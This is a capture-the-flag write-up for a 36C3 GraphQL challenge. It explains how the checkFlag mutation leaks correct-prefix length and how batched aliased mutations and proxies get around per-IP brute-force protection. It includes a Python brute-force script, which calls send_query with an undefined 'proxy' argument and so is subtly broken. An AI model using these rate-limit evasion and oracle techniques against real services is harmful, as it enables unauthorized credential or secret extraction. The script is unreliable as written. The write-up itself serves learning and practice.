# querying
Web, Medium

## Description

> In German, Graf means count. Anyway I'm certain he likes pie. Who doesn't? He also won't give you the Flag as he keeps track of every request. Nothing to see here, please move along. http://199.247.4.207:4000/

A tar file was attached.

## Solution

Let's inspect the tar file:

```console
root@kali:/media/sf_CTFs/36c3/querying# tree dist.tar/
dist.tar/
├── dist
│   ├── docker-compose.yml
│   ├── Dockerfile
│   ├── package.json
│   ├── package-lock.json
│   ├── prisma
│   │   ├── datamodel.prisma
│   │   ├── prisma.yml
│   │   └── seed.graphql
│   ├── src
│   │   ├── generated
│   │   │   └── prisma-client
│   │   │       ├── index.d.ts
│   │   │       ├── index.js
│   │   │       └── prisma-schema.js
│   │   ├── index.js
│   │   └── schema.graphql
│   └── yarn.lock
└── dist.tar
```

This archive contains the backend of a service. The interesting part of the backend is `index.js`:

```javascript
const { GraphQLServer } = require('graphql-yoga')
const LRU = require('lru-cache')

const { prisma } = require('./generated/prisma-client')

const MAX_WAIT = 10 * 1000 // 10 seconds

const FLAG = "junior-THIS_IS_A_DUMMY"
const FLAG_REGEX = /$junior-[a-zA-Z0-9_]24^/.compile()

const requestsPerClient = new LRU({
  max: 16 * 1024,
  maxAge: 1000 * 60
})

function bruteforceProtection(context) {
  const ip = context.request.ip
  if (context.request.headers["admin"]) {
    console.log("ip", ip)
    let requests = requestsPerClient.get(ip) || 0
    const waitTime = 15 * requests * 1000
    requestsPerClient.set(ip, requests + 1)
    return new Promise(
      resolve => setTimeout(
        () => (console.log("finished", ip, waitTime) || resolve()), waitTime
      )
    )
  }
  return Promise.resolve()
}

const resolvers = {
  Query: {
    feed: (parent, args, context) => {
      return context.prisma.posts({ where: { published: true } })
    },
    drafts: (parent, args, context) => {
      return context.prisma.posts({ where: { published: false } })
    },
    post: (parent, { id }, context) => {
      return context.prisma.post({ id })
    },
  },
  Mutation: {
    checkFlag(parent, {flag}, context) {
      if (!context.request.headers["admin"]) throw "Preheat oven!"
      if (FLAG_REGEX.exec(flag) && flag === FLAG) return FLAG.length
      let i = 0
      while (flag[i] === FLAG[i]) i++
      return i
    },
    createDraft(parent, { title, content }, context) {
      return context.prisma.createPost({
        title,
        content,
      })
    },
    deletePost(parent, { id }, context) {
      return context.prisma.deletePost({ id })
    },
    publish(parent, { id }, context) {
      return context.prisma.updatePost({
        where: { id },
        data: { published: true },
      })
    },
  },
}

const server = new GraphQLServer({
  typeDefs: './src/schema.graphql',
  resolvers,
  context: async (request, response, fragmentReplacements) => ({
    ...request,
    prisma,
    console: await bruteforceProtection(request)
  }),
})

server.start(() => console.log('Server is running on http://localhost:4000'))
```

This looks like a `GraphQL` service:

> GraphQL is an open-source data query and manipulation language for APIs, and a runtime for fulfilling queries with existing data. 

The website at `http://199.247.4.207:4000/` offered an online IDE allowing to perform queries to the backend. 

Let's take a look at `checkFlag`:

```javascript
checkFlag(parent, {flag}, context) {
    if (!context.request.headers["admin"]) throw "Preheat oven!"
    if (FLAG_REGEX.exec(flag) && flag === FLAG) return FLAG.length
    let i = 0
    while (flag[i] === FLAG[i]) i++
    return i
}
```

This function actually tells us, given a flag string that we provide, how many consecutive characters we got right. The catch is that it's protected by a `bruteforceProtection` which limits the number of queries that we can perform in a given period. 

A single request to the server would look like:

```javascript
mutation { 
    checkFlag(flag: "junior-A")
}
```

If we will receive a response of `7` from the server, we know that only the `junior-` prefix matches the flag, and we should continue to the next attempt:

```javascript
mutation { 
    checkFlag(flag: "junior-B")
}
```

Once we recive an `8`, we know that we found the correct character and move on to the next index in the flag. According to the `FLAG_REGEX`, we have 24 characters apart from the prefix. We also know that the flag only consists of uppercase and lowercase letters, digits and the underscore character. Even so, if we have to wait between every request it would take quite a while to get the full flag.

The brute force protection is coupled with the requesters IP, so one naive way of bypassing it would be to use many proxies. However, there's a better way: Batch requests.

Instead of the syntax above, we can use the following syntax:

```javascript
mutation {
  name1: checkFlag(flag: "junior-A"),
  name2: checkFlag(flag: "junior-B"),
}
```

This sends two simultaneous requests which count as one for the brute force protection. We can generalize this and send all possible options in a single request.

```python
import requests, json, string
import operator

def send_query(flag):
    alphabet = string.ascii_letters + string.digits + '_'
    prefix = "flag_"

    mutation = "mutation {"
    for c in alphabet:
        mutation += "{}: checkFlag(flag: \"{}\"),".format(prefix + c, flag + c)
    mutation += "}"

    json_data = {
        "operationName": None,
        "variables": {},
        "query": mutation
    }
    r = requests.post("http://199.247.4.207:4000/", json=json_data, headers={"admin": "1"})
    data = r.json()["data"]
    c = max(data.items(), key=operator.itemgetter(1))[0]
    return c.replace(prefix, "")

flag = ""

while len(flag) < 31:
    c = send_query(flag, proxy)
    print (c, end='', flush=True)
    flag += c
        
print("")
print(flag)
```

We still need to wait a bit between requests, but the flag returns within a reasonable time. Combined with a list of (good) proxies, the flag would return almost immediately.

The flag: `junior-Batching_Qu3r1e5_is_FUN1`